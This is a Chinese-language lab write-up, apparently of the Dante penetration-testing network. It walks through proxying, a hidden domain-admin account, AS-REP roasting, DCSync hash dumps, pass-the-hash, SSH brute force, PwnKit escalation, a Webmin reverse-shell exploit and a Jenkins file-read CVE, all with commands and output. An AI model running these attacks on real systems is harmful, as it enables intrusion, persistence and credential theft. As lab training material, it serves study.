<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218144938806.png" alt="image-20250218144938806"></p>
<p>我们在查看信息的时候，我们发现当前机器属于<code>DANTE.local</code>这个域中的一台机器</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216183853224.png" alt="image-20250216183853224"></p>
<p>我们先设置一个二层代理，方便后续进行操作：</p>
<pre class="line-numbers language-none"><code class="language-none">frpc.exe -c frpc.toml

&#x2F;&#x2F;frpc.toml
serverAddr &#x3D; &quot;10.10.17.141&quot;
serverPort &#x3D; 7000

[[proxies]]
name &#x3D; &quot;socks5&quot;
type &#x3D; &quot;tcp&quot;
remotePort &#x3D; 6000
[proxies.plugin]
type &#x3D; &quot;socks5&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建隐蔽管理员方便后续：</p>
<pre class="line-numbers language-none"><code class="language-none">net user hiddenadmin P@ssw0rd123 &#x2F;add &#x2F;domain
net group &quot;Domain Admins&quot; hiddenadmin &#x2F;add &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后我们在查看路由和arp表之后都没发现新的网段：</p>
<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all 
route print 
arp -a 
netstat -ano 
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig &#x2F;displaydns | findstr &quot;Record&quot; | findstr &quot;Name Host&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以怀疑是域环境的隐藏网段，我们仔细检查下：</p>
<pre class="line-numbers language-none"><code class="language-none">for &#x2F;L %i in (1,1,254) do ping -n 1 172.16.%i.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现一个新的网段<code>172.16.2.0/24</code>，我们手动给他添加进去：</p>
<pre class="line-numbers language-none"><code class="language-none">run autoroute -s 172.16.2.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>现在拿msf进行下端口扫描</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp
set RHOSTS 10.10.10.0&#x2F;24   # 设置目标网段或单个 IP
set THREADS 10             # 设置线程数（提高扫描速度）
set PORTS 1-65535          # 指定端口范围（默认扫描 1-10000）
run                        # 运行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218181431670.png" alt="image-20250218181431670"></p>
<h4 id="172-16-2-5"><a href="#172-16-2-5" class="headerlink" title="172.16.2.5"></a>172.16.2.5</h4><p>我们先上传fscan来进行扫描，发现开放了下面的端口，并且获得机器的机器名<code>DANTE-DC02</code></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218170033053.png" alt="image-20250218170033053"></p>
<p>然后我们通过smb服务的匿名登陆来枚举用户名：</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;桌面&#x2F;tool&#x2F;fscan]
└─# proxychains4 crackmapexec smb 172.16.2.5 --users
[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf
[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:135  ...  OK
SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 &#x2F; Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:389  ...  OK
SMB         172.16.2.5      445    DANTE-DC02       [-] Error enumerating domain users using dc ip 172.16.2.5: NTLM needs domain\username and a password
SMB         172.16.2.5      445    DANTE-DC02       [*] Trying with SAMRPC protocol
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:139  ...  OK
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取的当前机器的域名<code>DANTE.ADMIN</code>，然后我们通kerberos协议来枚举用户名，用户名单就用<code>DANTE-DC01</code>上的用户名</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 .&#x2F;kerbrute_linux_amd64 userenum --dc 172.16.2.5 -d dante &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里不知道是网络的原因还是其他原因，就是没法枚举成功，老是报错，最后看其他师傅的wp发现存在 <code>jbercov@dante</code>用户，然后继续向下进行攻击；</p>
<p>他开启的kerberos服务，针对没有启用 Kerberos 预身份验证的用户，可以使用 ASREProast 获取用户的 TGT，此过程不需要具备域账户，只需要与 KDC 建立连接即可进行攻击。</p>
<pre class="line-numbers language-none"><code class="language-none">─# proxychains4 impacket-GetNPUsers dante&#x2F;jbercov -dc-ip 172.16.2.5 -no-pass -outputfile kerberoas.hash
[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf
[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20241209.91717.0fd9f288 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for jbercov
&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now &#x3D; datetime.datetime.utcnow() + datetime.timedelta(days&#x3D;1)
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:88  ...  OK
$krb5asrep$23$jbercov@DANTE:7bf913dc41a4ad59030318a38fb5d164$36eea9f5ff52ed9995204714bdc582ba99b2c292e3554f9d77d46f4fb7599ba2d7c85691d2cb815e1355d0c9fda0d6a59a780ed17f078169532d3ceef6c9597f6c8a066ecf3ad54d568d109c64e30d052a93cf5c62c75a0306715c0cba7403dd11062da7942c797a19645f557737cd92259a471c9dc371ddf9980333ede028f6bcc44f0645c4db9034ae3c1e83b98e2f278a86733e31b314a3d0cc436b78d449064212bb8c93750f1a4b2b1dce771f87bf990acea3e63ebc4202a4c874b1ebe04926b90a582a0bb47a1150e3539985001a686d52c68c4a7f9679c878fd9821634c12ecf1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取hash之后，我们直接通过john破解下这个密码：</p>
<pre class="line-numbers language-none"><code class="language-none">john test.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218193501103.png" alt="image-20250218193501103"></p>
<p>破解出了密码<code>myspace7</code>，因为其开放了5985端口，我们就能直接通过winRM服务直接登陆</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 evil-winrm -i 172.16.2.5 -u jbercov -p myspace7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218193954150.png" alt="image-20250218193954150"></p>
<p>然后获取了第一个flag，然后进行先用msf进行上线，方便后续提权和查看该网段的其他机器，这里我们通winRM上传猎犬工具，然后进行信息收集</p>
<pre class="line-numbers language-none"><code class="language-none">SharpHound.exe -c all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以发现 JBERCOV 用户具备 GetChangesAll 权限，而 GetChangesAll 权限意味着可以利用 DCSync 导出域内的所有 hash。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/20231229082415.png" alt="20231229082415"></p>
<p>我们直接导出hash：</p>
<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;桌面]
└─# proxychains4 impacket-secretsdump -outputfile 172.16.2.5_DCSync DANTE.ADMIN&#x2F;jbercov:myspace7@172.16.2.5
[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf
[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20241209.91717.0fd9f288 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:135  ...  OK
[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:ffbe21062cddbf4accba17eba4d585dc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
DANTE-DC02$:aes256-cts-hmac-sha1-96:b963259a2baabfec12c8978a882fe09e4cf673e71921c79ba5470518500d3b16
DANTE-DC02$:aes128-cts-hmac-sha1-96:18ff2cb601e566d15e80adb9b595a406
DANTE-DC02$:des-cbc-md5:a140fd8083f84576
[*] Cleaning up... <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后通过hash传递直接通过<code>impacket-psexec</code>来进行登陆即可</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-psexec &#39;DANTE.ADMIN&#x2F;Administrator@172.16.2.5&#39; -hashes &#39;aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以通过msf的模块来进行上线：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec
set RHOSTS 172.16.2.5
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
set LHOST 10.10.17.141
set LPORT 9999
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>在管理员的目录中发现了这个文件，存在一个账号和密码</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219002933994.png" alt="image-20250219002933994"></p>
<p>先记录下，后续备用，然后我们上传fscan，扫描下这个网段是否还有其他的存活ip，也可直接使用命令来进行探测</p>
<pre class="line-numbers language-none"><code class="language-none">(for &#x2F;L %a IN (1,1,254) DO ping &#x2F;n 1 &#x2F;w 1 172.16.2.%a) | find &quot;Reply&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219031413006.png" alt="image-20250219031413006"></p>
<p>能够发现<code>172.16.2.101</code>的是开放的，且只开放了22端口，我们搭个代理出来，方便后续进行操作</p>
<h4 id="172-16-2-101"><a href="#172-16-2-101" class="headerlink" title="172.16.2.101"></a>172.16.2.101</h4><p>由于只开放了22端口，我们又在之前获得了一堆账号和密码，我们现在讲之前获取的账号密码组成密码本，进行爆破，可以通过msf的模块来进行操作：</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login
set USERPASS_FILE &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;password.txt
set RHOSTS 172.16.2.101
set VERBOSE true
set ThREADS 10
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>也可以通hydra来进行爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 hydra -L users1.txt -P password.txt ssh:&#x2F;&#x2F;172.16.2.101 -t 2 -W 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里由于不知道啥原因，我都msf没法进行爆破，我是用hydra来进行爆破的：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219221855772.png" alt="image-20250219221855772"></p>
<p>我们获得了一组账号，<code>julian|manchesterunited</code>，我们登陆下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219222025534.png" alt="image-20250219222025534"></p>
<p>登陆成功，我们想办法提权，这里我们就不用msf了，应为没法连上这个地址，估计是代理的原因，我们直接使用工具进行提权，先上传工具扫描下漏洞：</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 scp &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;tool&#x2F;linux-exploit-suggester&#x2F;linux-exploit-suggester.sh julian@172.16.2.101:&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>扫描出如下结果：</p>
<pre class="line-numbers language-none"><code class="language-none">julian@DANTE-ADMIN-NIX05:&#x2F;tmp$ .&#x2F;linux-exploit-suggester.sh

Available information:

Kernel version: 5.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2022-2586] nft_object UAF

   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
   Exposure: probable
   Tags: [ ubuntu&#x3D;(20.04) ]&#123;kernel:5.12.13&#125;
   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ],debian&#x3D;7|8|9|10|11,fedora,manjaro
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint&#x3D;19,[ ubuntu&#x3D;18|20 ], debian&#x3D;10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos&#x3D;6|7|8,[ ubuntu&#x3D;14|16|17|18|19|20 ], debian&#x3D;9|10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
   Exposure: probable
   Tags: [ ubuntu&#x3D;20.04 ]&#123;kernel:5.8.0-*&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
   Exposure: less probable
   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们继续使用这个<code>PwnKit</code>漏洞进行提权，将漏洞利用文件下载下来，上传上服务器，然后利用即可提权：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219223452084.png" alt="image-20250219223452084"></p>
<p>然后将fscan上传上去扫描下有没有新的机器，扫描出如下结果：</p>
<pre class="line-numbers language-none"><code class="language-none"># .&#x2F;fscan -h 172.16.2.1&#x2F;24

   ___                              _    
  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ 
 &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;
&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\   
                     fscan version: 2.0.0
[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] 开始信息扫描...
[*] CIDR范围: 172.16.2.0-172.16.2.255
[*] 已生成IP范围: 172.16.2.0 - 172.16.2.255
[*] 已解析CIDR 172.16.2.1&#x2F;24 -&gt; IP范围 172.16.2.0-172.16.2.255
[*] 最终有效主机数量: 256
[+] 目标 172.16.2.101    存活 (ICMP)
[+] 目标 172.16.2.5      存活 (ICMP)
[+] 目标 172.16.2.6      存活 (ICMP)
[+] ICMP存活主机数量: 3
[*] 共解析 218 个有效端口
[+] 端口开放 172.16.2.6:22
[+] 端口开放 172.16.2.5:445                                                                         
[+] 端口开放 172.16.2.5:139                                                                         
[+] 端口开放 172.16.2.5:135                                                                         
[+] 端口开放 172.16.2.5:88                                                                          
[+] 端口开放 172.16.2.101:22                                                                        
[+] 存活端口数量: 6                                                                                 
[*] 开始漏洞扫描...
[!] 扫描错误 172.16.2.5:445 - read tcp 172.16.2.101:34404-&gt;172.16.2.5:445: read: connection reset by peer
[*] NetBios 172.16.2.5      [+] DC:DANTE\DANTE-DC02        
[*] NetInfo
[*] 172.16.2.5
   [-&gt;] DANTE-DC02
   [-&gt;] 172.16.2.5
[!] 扫描错误 172.16.2.5:88 - Get &quot;http:&#x2F;&#x2F;172.16.2.5:88&quot;: read tcp 172.16.2.101:51380-&gt;172.16.2.5:88: read: connection reset by peer
[!] 扫描错误 172.16.2.6:22 - 扫描总时间超时: context deadline exceeded
[!] 扫描错误 172.16.2.101:22 - 扫描总时间超时: context deadline exceeded
[+] 扫描已完成: 6&#x2F;6
[*] 扫描结束,耗时: 12.098649778s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>出现了一个<code>172.16.2.6</code>，然后开放端口只有22，我们继续向下进行渗透</p>
<h4 id="172-16-2-6"><a href="#172-16-2-6" class="headerlink" title="172.16.2.6"></a>172.16.2.6</h4><p>依旧先想办法搭个代理出来，三成代理，现在是：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219225657314.png" alt="image-20250219225657314"></p>
<p>搭建成功时候依旧还是进行ssh密码爆破，因为只开放了22端口：</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 hydra -L users1.txt -P password.txt ssh:&#x2F;&#x2F;172.16.2.6 -t 2 -W 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里我们需要降低速度，因为这个三成代理非常不稳定，我也不知道为什么，爆破速度一快就容易断连，最后爆出的密码与<code>172.16.2.101</code>一样：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219230136653.png" alt="image-20250219230136653"></p>
<p>密码是<code>julian|manchesterunited</code>、<code>plongbottom|PowerfixSaturdayClub777</code>，现在我们依旧登陆下：</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 ssh julian@172.16.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在桌面查看到一个SQL文件：</p>
<pre class="line-numbers language-none"><code class="language-none">julian@DANTE-ADMIN-NIX06:~&#x2F;Desktop$ cat SQL
Hi Julian
I&#39;ve put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I&#39;ve reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>找到一个密码，留着备用，检查之后没有简单的可提权的点，切换下另一个账户，在这个账户中发现能够以root权限执行，所以能够sudo提权：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo sudo &#x2F;bin&#x2F;sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219232852786.png" alt="image-20250219232852786"></p>
<p>提权成功，获取最后flag：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219233012997.png" alt="image-20250219233012997"></p>
<p>检查下是否存在其他子网，或是其他ip，我们直接上传fscan扫描</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219233355080.png" alt="image-20250219233355080"></p>
<p>到此，这个域就算渗透成功，爆爽！</p>
<h3 id="172-16-1-17"><a href="#172-16-1-17" class="headerlink" title="172.16.1.17"></a>172.16.1.17</h3><p>扫描结果如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216191542933.png" alt="image-20250216191542933"></p>
<p>开放了80和10000端口，我们先看一眼80端口，发现存在一个zip文件，我们先将其下载下来，再进行分析：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216191813053.png" alt="image-20250216191813053"></p>
<p>下载后发现源代码是<code>webmin</code>的<code>1.900</code>版本的源代码，除此之外没找到其他有用的东西，然后10000端口就是正常的webmin的服务，需要登陆，没有密码，我们考虑密码爆破和现有漏洞的利用，我们先搜索下现有的漏洞：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216202049259.png" alt="image-20250216202049259"></p>
<p>但是经过检查之后我发现都需要账号和密码，所以我们先进性密码爆破，看看能不能爆出密码，我们通过burp爆破出最后的密码为</p>
<p><code>Password6543</code></p>
<p>然后我们直接用msf的webmin相关的脚本进行渗透，我这里用的是下面的漏洞：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce
set rhost 172.16.1.17
set lhost 10.10.17.141
set lport 6666
set payload set payload cmd&#x2F;unix&#x2F;reverse_netcat
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们就能成功：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217020518243.png" alt="image-20250217020518243"></p>
<p>然后直接反弹shell出来，在root目录中找到了我们的flag，这台机器也就完成了：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217023208508.png" alt="image-20250217023208508"></p>
<h3 id="172-16-1-19"><a href="#172-16-1-19" class="headerlink" title="172.16.1.19"></a>172.16.1.19</h3><p>扫描结果如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217023325287.png" alt="image-20250217023325287"></p>
<p>我们能够看到8080是一个Jenkins 2.24版本的服务，访问页面是一个登陆界面，我们先搜索现有漏洞看看是否能利用：</p>
<p>我们搜索到一个任意文件读取的漏洞，参考<a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.zh-cn.md">Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</a>这篇文章，我们直接通过这个漏洞进行文件读取：</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http help 1 &quot;@&#x2F;proc&#x2F;self&#x2F;environ&quot;    &#x2F;&#x2F;看文件目标路径
